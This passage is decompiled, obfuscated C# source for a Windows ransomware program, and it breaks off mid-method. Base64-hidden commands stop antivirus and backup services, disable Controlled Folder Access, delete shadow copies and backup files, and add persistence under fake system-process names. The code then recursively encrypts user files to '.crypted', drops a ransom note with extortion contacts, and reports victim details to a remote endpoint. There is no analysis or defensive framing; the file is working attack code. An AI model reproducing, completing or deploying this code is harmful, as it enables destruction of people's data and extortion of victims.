using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace oiBbJupDERGF;

internal class IkMjOMZbHrXB
{
	public class tJvYWIDhNoZC
	{
		private static StringCollection PdXTQhJHvlTDTei = new StringCollection();

		private static List<string> QQxLiFzLinbl = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				PdXTQhJHvlTDTei.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().EndsWith(".crypted"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(rVQUebAfpyi) * 1024.0 * 1024.0 && xGIrNzgCtCuC == "YES")
							{
								QQxLiFzLinbl.Add(text);
							}
							else if (File.Exists(text) && xGIrNzgCtCuC == "NO")
							{
								QQxLiFzLinbl.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				array3 = array2;
				foreach (string root2 in array3)
				{
					WalkDirectoryTree(root2);
				}
			}
			return QQxLiFzLinbl;
		}
	}

	[CompilerGenerated]
	private sealed class HwffuFbHOroInXG
	{
		public string[] DYndEABjlah;

		public string[] qgmNnGrftGwAVEk;

		public string AFfKYncnpIrgf;

		public string AgMbYTmJpWQjnhp;
	}

	[CompilerGenerated]
	private sealed class JCovcbCOgTS
	{
		public HwffuFbHOroInXG fswEYECIdtksZ;

		public string DtYVFXqVyL;

		public void _003CCrypt_003Eb__6()
		{
			TegeViBeBkJ(DtYVFXqVyL, fswEYECIdtksZ.DYndEABjlah, fswEYECIdtksZ.AgMbYTmJpWQjnhp, fswEYECIdtksZ.qgmNnGrftGwAVEk, fswEYECIdtksZ.AFfKYncnpIrgf);
		}
	}

	public static string CaxanfadcSKH = "EVET";

	public static string[] GvUesNmbzq;

	public static IEnumerable<DirectoryInfo> CHJMCwkDABwK;

	public static byte[] VgnHBSjozGF = null;

	public static DirectoryInfo AOraoIBhKdF;

	public static string xGIrNzgCtCuC = "NO";

	public static string rVQUebAfpyi = "100000000";

	public static List<string> VoKqyJGUqLEnsnMI = new List<string>();

	public static List<string> fsofWANNaJH = new List<string>();

	public static string wxNDVEuyNa = "NO";

	public static string FfQGJfWTTBegBu = "";

	public static string LTlgqPTPldyj = "NO";

	public static int essfbdyCYJLIifT = 0;

	public static string lKfjHgiYcaJqT = "NO";

	public static string PctQlZfGJjilT = "NO";

	public static string UjSvitKENOa = "NO";

	public static string pgnhGIeHDOYzZh = "0";

	public static string CbkOenKmDpxucv = "NO";

	public static string MZfghVAZGvg = "NO";

	public static string yCgoPOtBbqGws = "YES";

	public static string IqQDAKgfXUYpP = "NO";

	public static List<string> lpGTjSaKdajq = new List<string>
	{
		ASyAXFKNbugHZ("bHNhc3MuZXhl"),
		ASyAXFKNbugHZ("c3ZjaHN0LmV4ZQ=="),
		ASyAXFKNbugHZ("Y3Jjc3MuZXhl"),
		ASyAXFKNbugHZ("Y2hyb21lMzIuZXhl"),
		ASyAXFKNbugHZ("ZmlyZWZveC5leGU="),
		ASyAXFKNbugHZ("Y2FsYy5leGU="),
		ASyAXFKNbugHZ("bXlzcWxkLmV4ZQ=="),
		ASyAXFKNbugHZ("ZGxsaHN0LmV4ZQ=="),
		ASyAXFKNbugHZ("b3BlcmEzMi5leGU="),
		ASyAXFKNbugHZ("bWVtb3AuZXhl"),
		ASyAXFKNbugHZ("c3Bvb2xjdi5leGU="),
		ASyAXFKNbugHZ("Y3RmbW9tLmV4ZQ=="),
		ASyAXFKNbugHZ("U2t5cGVBcHAuZXhl")
	};

	public static List<string> YSBKaCuBTRXbTz = new List<string>();

	public static string lKRTSIXBSErYNpN = "YES";

	public static string ODRnZKEgcKJsU = "NO";

	public static string rqXlWoLEZL = "NO";

	public static List<string> AFuausPFGlCL = new List<string>();

	public static string NglFLtyiiZe = "NO";

	private static string GtmYZzFSeoqUa = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string GMtFhBkvDYsInky = "NO";

	public static string tHUpkvQpYnBKloa = "YES";

	public static List<string> xLMxjbxqSrfkmN = new List<string>
	{
		ASyAXFKNbugHZ("c3RvcCBhdnBzdXMgL3k="),
		ASyAXFKNbugHZ("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBtZmV3YyAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		ASyAXFKNbugHZ("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBEZWZXYXRjaCAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBjY0V2dE1nciAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBjY1NldE1nciAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBTYXZSb2FtIC95"),
		ASyAXFKNbugHZ("c3RvcCBSVFZzY2FuIC95"),
		ASyAXFKNbugHZ("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		ASyAXFKNbugHZ("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBZb29CYWNrdXAgL3k="),
		ASyAXFKNbugHZ("c3RvcCBZb29JVCAveQ=="),
		ASyAXFKNbugHZ("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		ASyAXFKNbugHZ("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		ASyAXFKNbugHZ("c3RvcCBWU05BUFZTUyAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		ASyAXFKNbugHZ("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		ASyAXFKNbugHZ("c3RvcCB2ZWVhbSAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		ASyAXFKNbugHZ("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBBY3JTY2gyU3ZjIC95"),
		ASyAXFKNbugHZ("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		ASyAXFKNbugHZ("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		ASyAXFKNbugHZ("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		ASyAXFKNbugHZ("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> SttkdgGhkwRR = new List<string>
	{
		ASyAXFKNbugHZ("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		ASyAXFKNbugHZ("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		ASyAXFKNbugHZ("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		ASyAXFKNbugHZ("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> OFzRLfcFbyWm = new List<string>
	{
		ASyAXFKNbugHZ("L0lNIG1zcHViLmV4ZSAvRg=="),
		ASyAXFKNbugHZ("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		ASyAXFKNbugHZ("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> iBzFygfUgW = new List<string>
	{
		ASyAXFKNbugHZ("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		ASyAXFKNbugHZ("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		ASyAXFKNbugHZ("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> VfybsfbEGkcZy = new List<string>
	{
		ASyAXFKNbugHZ("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		ASyAXFKNbugHZ("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		ASyAXFKNbugHZ("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		ASyAXFKNbugHZ("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		ASyAXFKNbugHZ("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		ASyAXFKNbugHZ("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string ndBHZbjUdKI = "NO";

	public static string QaSgTkdIFMVa = "NO";

	internal static DateTime GUfNqtcTXzhCA = new DateTime(2000, 1, 1);

	internal static DateTime IoflakWTsRRt = new DateTime(2100, 1, 1);

	public static string KXQFsMRRuBWIoq = "NO";

	public static string TjAoETowzDgw = "10";

	public static string VzdwvtScUPqEuw = "YES";

	public static string baPvfZBICGTKGR = "NO";

	public static string eHbmQyYhHIAu = "NO";

	public static string RhcaeKJFeYlhExW = "NO";

	public static string kJoqHNiSEDJTYF = "NO";

	public static string KnzEUNhFctqwc = "NO";

	public static List<string> BgcOIRNMjYAp = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string PvdRPFClLZx = "NO";

	public static string qSJyejaNKxTTs = "1";

	public static string LjBLeOZbfJxD = "NO";

	public static string MrkHYbDoKLdS = "NO";

	public static string kxmBQDUsphBsHBZ = "NO";

	public static string ydmngbcRaj = string.Empty;

	public static string cTYhwxmLSbo = "YES";

	public static string mHdDRsGpOpv = "YES";

	public static string VAmLyIWQRHxB = "YES";

	public static string WHMrqbEzohTr = "SEFDS0VE";

	public static string YUXKrwJUIV = "WU9VIEFSRSBIQUNLRUQ=";

	public static string wvsIiGvGsaXgI = "NO";

	public static string PBiTNtQSyxSucbEt = "YES";

	public static string ikSTJdvcEyNJWxB = "NO";

	public static string uHdSYWehevEsL = "NO";

	private static void Main(string[] args)
	{
		//IL_0856: Unknown result type (might be due to invalid IL or missing references)
		//IL_0866: Unknown result type (might be due to invalid IL or missing references)
		//IL_0877: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			LxivsQSDQubIRQ.ustSKkleyiFYz(GtmYZzFSeoqUa);
		}
		catch (Exception)
		{
		}
		if (UjSvitKENOa == "YES")
		{
			Thread.Sleep(int.Parse(pgnhGIeHDOYzZh));
		}
		if (RhcaeKJFeYlhExW == "YES" && kJoqHNiSEDJTYF == "YES")
		{
			try
			{
				ZrfhubHEKEzdnBqN(ASyAXFKNbugHZ("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (yCgoPOtBbqGws == "YES" && !TIyRHzZTpzmGTup.hCyuPkKNhtDUAL())
		{
			TIyRHzZTpzmGTup.lODjtaIGKPsBy();
		}
		if (ODRnZKEgcKJsU == "YES" && TIyRHzZTpzmGTup.hCyuPkKNhtDUAL())
		{
			new RQdEQruvWsDRj().dsDednzvacs(LCcWOtWLCEvFrLz: false);
			new RQdEQruvWsDRj().tRmQMPxzlwI();
		}
		if (PctQlZfGJjilT == "YES")
		{
			EXgKGxZTmYoDqW.LvXlWBpdfgQN();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (LTlgqPTPldyj == "YES" && fileName != text2)
		{
			Thread thread = new Thread(ydzGSfIkLh);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Highest;
			thread.Start();
		}
		if (wxNDVEuyNa == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				essfbdyCYJLIifT = jTlybwilvTICVLR(0, lpGTjSaKdajq.Count);
				File.Copy(fileName, text + lpGTjSaKdajq[essfbdyCYJLIifT], overwrite: true);
				Process.Start(text + lpGTjSaKdajq[essfbdyCYJLIifT]);
				AeLVulBnAvpAKW();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (ndBHZbjUdKI == "YES" && DateTime.Now < GUfNqtcTXzhCA)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (QaSgTkdIFMVa == "YES" && DateTime.Now > IoflakWTsRRt)
			{
				AeLVulBnAvpAKW();
			}
		}
		catch
		{
		}
		foreach (string item in xLMxjbxqSrfkmN)
		{
			TscPplUQcQPqNrJAe("net.exe", item);
		}
		foreach (string item2 in SttkdgGhkwRR)
		{
			TscPplUQcQPqNrJAe("sc.exe", item2);
		}
		foreach (string item3 in OFzRLfcFbyWm)
		{
			TscPplUQcQPqNrJAe("taskkill.exe", item3);
		}
		foreach (string item4 in iBzFygfUgW)
		{
			TscPplUQcQPqNrJAe("vssadmin.exe", item4);
		}
		foreach (string item5 in VfybsfbEGkcZy)
		{
			TscPplUQcQPqNrJAe("del.exe", item5);
		}
		TbzgvoSOTAHq.RxRRxzeHZzzISP();
		if (lKRTSIXBSErYNpN == "YES")
		{
			MgRPUagfcxhsLRBGgo.xAXhnBjCWRB();
		}
		if (tHUpkvQpYnBKloa == "YES")
		{
			MltrzlfJFneL.mosJTxbEzXy();
		}
		if (VzdwvtScUPqEuw == "NO")
		{
			FfQGJfWTTBegBu = LOyuQmPWuCaf.MuFKaexBLM(32);
		}
		else
		{
			FfQGJfWTTBegBu = "RL4WQJ0OTC7P8W4VY3MKOQNZF7IWC3LI";
		}
		string text3 = wkRleRVzdWR.AfBcnfbTgIbqx(FfQGJfWTTBegBu);
		if (PBiTNtQSyxSucbEt == "YES")
		{
			try
			{
				SagxpTQHkrlex();
			}
			catch
			{
			}
		}
		if (cTYhwxmLSbo == "YES" && args.Length > 0)
		{
			try
			{
				if (!File.Exists(args[0]))
				{
					JPAnrnwlrKvgz(new string[1] { args[0] }, new string[101]
					{
						"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
						"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
						"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
						"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
						"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
						"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
						"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
						"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
						"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
						"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
						"7z"
					}, new string[0], FfQGJfWTTBegBu, ".crypted");
					MessageBox.Show("Done!");
				}
				else
				{
					MessageBox.Show("This procedure is for local directories, not for individual files!");
				}
				return;
			}
			catch
			{
				MessageBox.Show("This procedure is for local directories, not for individual files!");
				return;
			}
		}
		try
		{
			JPAnrnwlrKvgz(new string[1] { "[auto]" }, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], FfQGJfWTTBegBu, ".crypted");
		}
		catch
		{
			AeLVulBnAvpAKW();
		}
		FfQGJfWTTBegBu = LOyuQmPWuCaf.MuFKaexBLM(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
			streamWriter.WriteLine(ASyAXFKNbugHZ("ISEhIFdBUk5JTkcgISEhIFdBUk5JTkcgISEhIFdBUk5JTkcgISEhDQpXaGVyZSBhcmUgbXkgZmlsZXM/IFdlIGhhdmUgdGhlbSBzYWZlbHkgY3lwaGVyZWQuDQpZb3Ugd2FudCB0aGVtIGJhY2s/DQoNCkNvbnRhY3Q6IHNlcnZvY3J5cHRAdHV0YW5vdGEuY29tDQpUZWxlZ3JhbSBNZXNzZW5nZXIgOiBAQ1JZUFRPTUFCDQoNCktleSBJZGVudGlmaWVyOg0KDQo="));
			streamWriter.WriteLine(text3);
			if (GMtFhBkvDYsInky == "NO")
			{
				streamWriter.WriteLine(ASyAXFKNbugHZ("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(AFuausPFGlCL.Count));
			}
		}
		foreach (string item6 in YSBKaCuBTRXbTz)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item6 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (NglFLtyiiZe == "YES")
		{
			try
			{
				if (GMtFhBkvDYsInky == "NO")
				{
					GVXldeVJtPwIJmbQ.vepSiGtuJmTiz("URL", "USERNAME", "ACCESO", ASyAXFKNbugHZ("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(ASyAXFKNbugHZ("aHR0cDovL2ljYW5oYXppcC5jb20=")) + ASyAXFKNbugHZ("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + ASyAXFKNbugHZ("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(AFuausPFGlCL.Count) + "\r\n" + ASyAXFKNbugHZ("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(AFuausPFGlCL) + "\r\n" + ASyAXFKNbugHZ("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					GVXldeVJtPwIJmbQ.vepSiGtuJmTiz("URL", "USERNAME", "ACCESO", ASyAXFKNbugHZ("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + ASyAXFKNbugHZ("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + ASyAXFKNbugHZ("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(AFuausPFGlCL) + "\r\n" + ASyAXFKNbugHZ("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (IqQDAKgfXUYpP == "YES")
		{
			try
			{
				fWWmvsfKBhtnZU.eQnCtCULhHGgmtl(new Uri("http://www.my_wallpaper_location.com/wallpaper.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(ASyAXFKNbugHZ("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (mHdDRsGpOpv == "YES")
		{
			eqFYTeLKdqKns();
			if (VAmLyIWQRHxB == "YES" && !string.IsNullOrEmpty(WHMrqbEzohTr) && !string.IsNullOrEmpty(YUXKrwJUIV))
			{
				mJiCIbdFhUSkkLUu(ASyAXFKNbugHZ(WHMrqbEzohTr), ASyAXFKNbugHZ(YUXKrwJUIV));
			}
			else
			{
				mJiCIbdFhUSkkLUu();
			}
		}
		if (!string.IsNullOrEmpty(ydmngbcRaj))
		{
			try
			{
				File.Delete(ydmngbcRaj);
			}
			catch
			{
			}
		}
		if (CaxanfadcSKH == "EVET")
		{
			AeLVulBnAvpAKW();
		}
	}

	public static void ydzGSfIkLh()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(ASyAXFKNbugHZ("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), ASyAXFKNbugHZ("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int jTlybwilvTICVLR(int UFbzBALpFqYCnNR, int TkwGZjnTzg)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(UFbzBALpFqYCnNR, TkwGZjnTzg);
	}

	public static List<string> RyyhPvpcKut(string hvXYhKAmqMRg)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(hvXYhKAmqMRg))
		{
			throw new ArgumentException();
		}
		stack.Push(hvXYhKAmqMRg);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00e6;
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00e6:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().EndsWith(".crypted"))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(rVQUebAfpyi) * 1024.0 * 1024.0 && xGIrNzgCtCuC == "YES")
						{
							list.Add(fileInfo.FullName);
						}
						else if (File.Exists(fileInfo.FullName) && xGIrNzgCtCuC == "NO")
						{
							list.Add(fileInfo.FullName);
						}
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> pWiRHKVxkLujs(string tJHUMRzRxg)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(tJHUMRzRxg);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
